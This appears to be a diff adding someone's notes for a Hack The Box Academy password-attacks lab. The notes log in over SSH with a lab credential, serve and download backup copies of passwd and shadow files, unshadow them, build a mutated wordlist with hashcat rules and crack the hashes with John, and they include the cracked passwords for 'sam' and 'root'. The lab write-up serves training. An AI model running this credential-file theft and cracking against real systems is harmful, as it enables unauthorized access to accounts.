@@ -1,1 +1,28 @@
+will:TUqr7QfLTLhruhVbCP
+1) ssh will@10.129.202.64 
+2) cd ~/.backups/
+3) on ssh session -> python3 -m http.server 
+4) on host machine 
+wget http://10.129.202.64:8000/passwd.bak
+wget http://10.129.202.64:8000/shadow.bak
+5) on host machine -> unshadow passwd.bak shadow.bak > unshadowed.hashes
 
+Created directory: /home/htb-ac330204/.john
+6) IF we dont have hte resoruces downloaded & mut_passsword.list made -> 
+wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip
+hashcat password.list -r custom.rule --stdout | sort -u > mut_password.list
+7) now lets crack with john -> 
+john unshadowed.hashes --wordlist=mut_password.list
+8) output:
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+B@tm@n2022!      (sam)
+J0rd@n5          (root)
+2g 0:00:00:50 DONE (2022-10-10 20:41) 0.03937g/s 1851p/s 4901c/s 4901C/s Yell0w2020!..Yellow99!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
